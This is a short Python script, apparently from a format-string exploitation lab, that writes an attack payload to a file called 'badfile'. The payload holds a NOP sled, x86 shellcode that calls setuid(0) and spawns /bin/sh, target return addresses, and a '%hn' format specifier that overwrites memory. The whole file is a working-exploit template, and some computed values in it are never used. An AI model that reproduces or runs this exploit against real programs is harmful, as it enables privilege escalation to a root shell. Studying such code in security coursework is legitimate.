#!/usr/bin/python3
import sys

shellcode = (
    "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
"\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"

).encode('latin-1')

N=200
#fill content with NOP
content = bytearray(0x90 for i in range(N))

#put the shellcode at the end
start = N - len(shellcode)
content[start:]=shellcode

#put the return address
ret_addr= 0xbfffef68
addr1 = ret_addr + 2
addr2 = ret_addr
content[0:4] = (addr1).to_bytes(4, byteorder="little")
content[4:8] = ("@@@@").encode('latin-1')
content[8:12] = (addr2).to_bytes(4, byteorder="little")

#Add the format specifiers
small = 0xbfff -12 - 19*8
large = 0xf024 - 0xbfff
s = "%" + str(addr1-12-4) + "x%8$hn"

fmt = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

#Write the content to badfile
with open('badfile', 'wb') as f:
    f.write(content)
    f.close()